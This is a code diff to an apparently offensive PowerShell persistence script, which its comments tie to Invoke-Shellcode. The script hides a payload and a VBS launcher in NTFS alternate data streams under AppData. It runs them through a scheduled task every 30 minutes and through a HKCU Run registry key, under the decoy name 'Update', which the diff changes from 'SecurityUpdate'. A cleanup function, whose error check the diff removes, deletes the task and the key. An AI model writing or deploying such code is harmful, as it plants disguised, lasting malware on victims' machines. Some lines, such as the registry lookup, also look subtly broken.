@@ -78,7 +78,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     #Create Alternate Data Streams for Payload and Wrapper
     $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
     $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
-    $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN SecurityUpdate /TR $env:USERPROFILE\AppData:$vbsFile /F"}
+    $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN Update /TR $env:USERPROFILE\AppData:$vbsFile /F"}
     Invoke-Command -ScriptBlock $CreatePayloadADS
     "Payload stored in $env:USERPROFILE\AppData:$textFile"
     Invoke-Command -ScriptBlock $CreateWrapperADS
@@ -86,9 +86,10 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     Invoke-Command -ScriptBlock $CreateScheduleADS
     "Schedule payload is triggered on every 30 minutes"
     
+
     #Persist in Registry
-    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SecurityUpdate -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
-    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate"
+    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
+    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
 }
 
 
@@ -161,21 +162,13 @@ removing the registry key.
 #>
 
     # get the VBS trigger command/file location from the registry
-    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run SecurityUpdate).Update
+    $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
     $vbsFile = $trigger.split(" ")[1]
     $getWrapperADS = {cmd /C "more <  $vbsFile"}
     $wrapper = Invoke-Command -ScriptBlock $getWrapperADS
-    $Killschtasks = {cmd /C "schtasks /delete /tn SecurityUpdate /f"}
+    $Killschtasks = {cmd /C "schtasks /delete /tn Update /f"}
     
     Invoke-Command -ScriptBlock $Killschtasks
-    
-    if ($Killschtasks){
-        "Successfully kill schtasks"
-    }
-    else{
-        "[!] Error: Couldn't kill scheduled payload 'SecurityUpdate'."
-    }
-    
     if ($wrapper -match 'i in \((.+?)\)')
     {
         # extract out the payload .txt file location
@@ -200,6 +193,6 @@ removing the registry key.
     }
 
     # remove the registry run key
-    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name SecurityUpdate;
-    "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'SecurityUpdate' key"
+    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;
+    "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'Update' key"
 }
